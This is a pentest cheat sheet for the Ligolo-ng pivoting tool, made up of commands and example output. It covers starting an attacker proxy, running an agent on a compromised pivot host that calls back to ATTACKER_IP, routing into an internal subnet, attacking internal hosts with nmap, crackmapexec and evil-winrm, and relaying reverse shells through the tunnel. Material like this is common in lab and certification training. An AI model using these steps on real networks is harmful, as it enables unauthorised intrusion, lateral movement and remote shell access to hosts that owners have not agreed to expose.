# LIGOLO-NG (ADVANCED PIVOTING)

### Start proxy (attacker)

```bash
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

> Run on attacker

**Why:** Proxy server

<details>
<summary>Example Output</summary>

```
ligolo-proxy -selfcert -laddr 0.0.0.0:443
INFO[0000] Listening on 0.0.0.0:443

Agent connects:
INFO[0005] Agent joined: john@pivot (172.16.1.5)

>> session
>> autoroute
>> start
(Direct access to 172.16.1.0/24, no proxychains needed)
```
</details>

---

### Start agent (pivot)

```bash
ligolo-agent -connect ATTACKER_IP:443 -ignore-cert
```

> Run on pivot host

**Why:** Connects back to proxy

<details>
<summary>Example Output</summary>

```
./ligolo-agent -connect 10.10.14.2:443 -ignore-cert
[*] Connection established
[*] Waiting for proxy configuration
(Agent running on pivot, connected to your proxy)
```
</details>

---

### Add route and start tunnel

```bash
session (select session)
autoroute
start
```

> In ligolo proxy interface

**Why:** Adds route to internal network

<details>
<summary>Example Output</summary>

```
ligolo>> session
  1 - john@pivot - 172.16.1.5
ligolo>> autoroute
[+] Route 172.16.1.0/24 added
ligolo>> start
[+] Tunnel started
(Direct access to internal network, no proxychains needed)
```
</details>

---

### Access internal network directly

```bash
nmap INTERNAL_IP
crackmapexec smb INTERNAL_IP
```

> No proxychains needed

**Why:** Transparent tunnel

<details>
<summary>Example Output</summary>

```
nmap -sT -Pn 172.16.1.10
crackmapexec smb 172.16.1.10
evil-winrm -i 172.16.1.10

(All tools work directly, no proxychains prefix needed)
(This is the main advantage of ligolo over chisel)
```
</details>

---

### Add listeners for reverse shells

```bash
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

> Forward reverse shells through tunnel

**Why:** Internal targets connect to pivot, you get shell

<details>
<summary>Example Output</summary>

```
ligolo>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

On internal target: reverse shell to 172.16.1.5:4444
Shell arrives at your machine on port 4444
(Reverse shells route through the tunnel)
```
</details>

---
